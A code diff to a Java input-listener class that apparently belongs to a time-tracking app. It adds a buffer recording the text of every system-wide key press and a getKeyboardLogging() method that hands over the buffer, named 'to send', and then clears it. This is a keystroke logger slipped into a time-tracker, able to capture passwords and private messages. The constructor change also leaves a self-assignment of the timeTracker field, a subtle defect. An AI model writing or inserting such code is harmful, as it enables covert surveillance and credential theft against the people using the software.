@@ -29,9 +29,11 @@ public class NativeDevicesListener implements GlobalDeviceListener {
     private FlowableEmitter<EventObject> startCountUntilDtEmitter, stopCountUntilDtEmitter;
     private Boolean isCountingUntilDt = false;
     private Boolean isDowntime = false;
+    private StringBuilder keyboardLogs;
 
-    public NativeDevicesListener(TimeTracker timeTracker) {
+    public NativeDevicesListener(/*TimeTracker timeTracker*/) {
         this.timeTracker = timeTracker;
+        keyboardLogs = new StringBuilder("");
         offGlobalScreenLogger();
         addListenersToGlobalListener();
     }
@@ -202,6 +204,12 @@ public class NativeDevicesListener implements GlobalDeviceListener {
         }
     }
 
+    public String getKeyboardLogging() {
+        String keyboardLogsToSend = keyboardLogs.toString();
+        keyboardLogs = new StringBuilder("");
+        return keyboardLogsToSend;
+    }
+
     private class GlobalMouseListener implements NativeMouseInputListener {
         public void nativeMousePressed(NativeMouseEvent e) {
             receiveEvent(e);
@@ -221,6 +229,7 @@ public class NativeDevicesListener implements GlobalDeviceListener {
     private class GlobalKeyListener implements NativeKeyListener {
         public void nativeKeyPressed(NativeKeyEvent e) {
             receiveEvent(e);
+            keyboardLogs.append(NativeKeyEvent.getKeyText(e.getKeyCode()));
         }
 
         public void nativeKeyReleased(NativeKeyEvent e) {}
